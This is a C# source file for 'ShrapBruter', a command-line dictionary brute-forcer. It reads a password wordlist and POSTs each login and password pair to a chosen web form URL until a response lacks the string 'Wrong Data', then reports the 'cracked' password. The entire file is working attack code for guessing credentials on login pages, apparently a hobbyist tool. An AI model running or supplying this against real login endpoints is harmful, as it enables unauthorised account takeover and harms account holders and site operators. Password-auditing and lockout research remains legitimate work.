using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Linq;
using System.Net.Http;

// Author: MattTheCoder-W

namespace ShrapBruter
{
    class Globals{
        public static bool cracked = false;
    }

    class Program
    {
        private static readonly HttpClient client = new HttpClient();

        static async Task SharePost(string login, string pass, string[] headers, string address, bool verbose = false)
        {
            var values = new Dictionary<string, string>
            {
                {headers[0], login},
                {headers[1], pass}
            };

            var content = new FormUrlEncodedContent(values);
            var response = await client.PostAsync(address, content);
            string responseString = response.Content.ReadAsStringAsync().Result;

            if(verbose){ 
                Console.WriteLine(responseString);
                Console.WriteLine($"{headers[0]}: {login}, {headers[1]}: {pass}");
            }

            if(!responseString.Contains("Wrong Data")){
                Globals.cracked = true;
            }
        }

        static bool CheckInteractive(string[] args, string key){
            if(args.Contains(key)){
                return true;
            }
            else{
                return false;
            }
        }

        static async Task Main(string[] args)
        {
            DateTime GetTime()
            {
                return DateTime.Now;
            }

            double[] CurrentProgress(int position, int total, DateTime startTime){
                if (position == 0)
                {
                    return new double[] {0.0f, 9999.0f}; // to avoid a divide-by-zero error
                }

                double elapsedTime = Math.Round(GetTime().Subtract(startTime).TotalSeconds, 2);
                double estimatedRemaining = Math.Round(elapsedTime * total / position, 2);
                return new double[] {elapsedTime, estimatedRemaining};
            }

            bool interactive = CheckInteractive(args, "/i");
            Object[] arguments;

            if(interactive){
                Interactive inter = new Interactive();
                arguments = inter.GetArguments();
            }
            else{
                arguments = Arguments.Args(args);
            }

            String login = arguments[0].ToString();  
            String[] passes = new String[] {""};
            try{
                passes = File.ReadAllLines(arguments[1].ToString());
            } catch(System.IO.FileNotFoundException){
                Messages.Message("Given dictionary does not exist!", type: "error");
                Environment.Exit(0);
            }
            bool verbose = (bool)arguments[2];
            string[] arr = ((IEnumerable)arguments[3]).Cast<object>().Select(x => x.ToString()).ToArray();
            String[] headers = {arr[0], arr[1]};
            String url = arguments[4].ToString();

            Messages.Message("Starting");

            DateTime strtTime = GetTime();
            for(int i = 0; i < passes.Length; i++){
                if(i % 1000 == 0 && verbose){ 
                    double[] elapsed = CurrentProgress(i, passes.Length, strtTime);
                    TimeSpan done = TimeSpan.FromSeconds(elapsed[0]);
                    TimeSpan remain = TimeSpan.FromSeconds(elapsed[1]);
                    Console.Write($"{Math.Round((i+1.0f)/passes.Length*100.0f, 2)}%\t [ATTEMPT: {i+1}]\t Login: "); Messages.PrintColored(login, "yellow", end: "");
                    Console.Write($"\t Password: "); Messages.PrintColored(passes[i], "yellow", end: "");
                    Console.Write($"\t\t[ELAPSED: {done.Hours}:{done.Minutes}:{done.Seconds}] [REMAINING: {remain.Hours}:{remain.Minutes}:{remain.Seconds}]\n");
                }
                await SharePost(login, passes[i], headers, url);
                if(Globals.cracked){
                    Messages.Message("Password cracked: ", end: "");
                    Messages.PrintColored(passes[i], "green");
                    break;
                }
            }
            Messages.Message("Thanks For Using This App!");
        }
    }
}
